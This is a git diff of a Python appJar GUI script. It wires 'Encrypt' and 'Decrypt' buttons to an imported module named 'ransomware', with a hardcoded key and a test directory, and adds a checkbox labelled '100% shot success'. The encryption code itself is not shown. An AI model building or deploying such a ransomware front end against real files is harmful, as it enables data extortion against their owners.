@@ -1,16 +1,15 @@
 # import the library
 from appJar import gui
+import ransomware
 
+key = "foopassword"
+path = "D:\\test\\"
 # handle button events
-#def press(button):
-#    if sdfbutton == "Cancel":
-#        app.stop()
-#    else:
-#        usr = app.getEntry("Username")
-#        pwd = app.getEntry("Password")
-#        print("User:", usr, "Pass:", pwd)
-#        app.addLabel("result", "Your name is: %s." % usr)
-#        app.emptyCurrentContainer()
+def press(button):
+    if (button == "Encrypt"):
+        ransomware.encrypt_files(path, key)
+    elif(button == "Decrypt"):
+        ransomware.decrypt_files(path, key)
 
 def createGUI():
     # create a GUI variable called app
@@ -31,8 +30,11 @@ def createGUI():
     app.check("100% shot success")
 
     # link the buttons to the function called press
-    #app.addButtons(["Submit", "Cancel"], press)
+    app.addButtons(["Encrypt", "Decrypt"], press)
 
 
     # start the GUI
     app.go()
+
+#if __name__ == "__main__":
+createGUI()
